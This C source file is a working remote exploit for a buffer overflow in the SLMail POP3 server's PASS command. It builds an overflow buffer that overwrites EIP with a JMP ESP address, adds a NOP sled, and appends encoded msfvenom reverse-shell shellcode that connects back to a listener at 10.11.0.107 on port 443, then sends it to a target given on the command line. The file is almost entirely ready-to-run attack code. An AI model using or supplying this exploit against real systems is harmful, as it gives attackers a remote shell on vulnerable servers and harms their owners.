/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.107 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
unsigned char shellcode[] = 
"\xd9\xca\xd9\x74\x24\xf4\x58\x31\xc9\xba\xae\x02\x2d\xaa\xb1"
"\x52\x31\x50\x17\x83\xe8\xfc\x03\xfe\x11\xcf\x5f\x02\xfd\x8d"
"\xa0\xfa\xfe\xf1\x29\x1f\xcf\x31\x4d\x54\x60\x82\x05\x38\x8d"
"\x69\x4b\xa8\x06\x1f\x44\xdf\xaf\xaa\xb2\xee\x30\x86\x87\x71"
"\xb3\xd5\xdb\x51\x8a\x15\x2e\x90\xcb\x48\xc3\xc0\x84\x07\x76"
"\xf4\xa1\x52\x4b\x7f\xf9\x73\xcb\x9c\x4a\x75\xfa\x33\xc0\x2c"
"\xdc\xb2\x05\x45\x55\xac\x4a\x60\x2f\x47\xb8\x1e\xae\x81\xf0"
"\xdf\x1d\xec\x3c\x12\x5f\x29\xfa\xcd\x2a\x43\xf8\x70\x2d\x90"
"\x82\xae\xb8\x02\x24\x24\x1a\xee\xd4\xe9\xfd\x65\xda\x46\x89"
"\x21\xff\x59\x5e\x5a\xfb\xd2\x61\x8c\x8d\xa1\x45\x08\xd5\x72"
"\xe7\x09\xb3\xd5\x18\x49\x1c\x89\xbc\x02\xb1\xde\xcc\x49\xde"
"\x13\xfd\x71\x1e\x3c\x76\x02\x2c\xe3\x2c\x8c\x1c\x6c\xeb\x4b"
"\x62\x47\x4b\xc3\x9d\x68\xac\xca\x59\x3c\xfc\x64\x4b\x3d\x97"
"\x74\x74\xe8\x38\x24\xda\x43\xf9\x94\x9a\x33\x91\xfe\x14\x6b"
"\x81\x01\xff\x04\x28\xf8\x68\x21\xa6\x02\x02\x5d\xba\x02\xd5"
"\x26\x33\xe4\xbf\x48\x12\xbf\x57\xf0\x3f\x4b\xc9\xfd\x95\x36"
"\xc9\x76\x1a\xc7\x84\x7e\x57\xdb\x71\x8f\x22\x81\xd4\x90\x98"
"\xad\xbb\x03\x47\x2d\xb5\x3f\xd0\x7a\x92\x8e\x29\xee\x0e\xa8"
"\x83\x0c\xd3\x2c\xeb\x94\x08\x8d\xf2\x15\xdc\xa9\xd0\x05\x18"
"\x31\x5d\x71\xf4\x64\x0b\x2f\xb2\xde\xfd\x99\x6c\x8c\x57\x4d"
"\xe8\xfe\x67\x0b\xf5\x2a\x1e\xf3\x44\x83\x67\x0c\x68\x43\x60"
"\x75\x94\xf3\x8f\xac\x1c\x13\x72\x64\x69\xbc\x2b\xed\xd0\xa1"
"\xcb\xd8\x17\xdc\x4f\xe8\xe7\x1b\x4f\x99\xe2\x60\xd7\x72\x9f"
"\xf9\xb2\x74\x0c\xf9\x96";

void exploit(int sock) {
      FILE *test;
      char *ptr;
      char userbuf[] = "USER madivan\r\n";
      char evil[2977];
      char buf[2977];
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
                       "\x90\x90\x90\x90\x90\x90\x90\x90";
      memset(buf, 0x00, 2977);
      memset(evil, 0x00, 2977);
      memset(evil, 0x43, 2977);
      *(long*)&evil[2606] = 0x5f4a358f; // set EIP after 2606 "C"s to the JMP ESP address
      ptr =&evil[2610];
      memcpy(ptr, &nopsled, 16); //nopsled after EIP instr
      ptr =&evil[2626];
      memcpy(ptr, &shellcode, 351);
      

      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Connect to the host on port 443...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}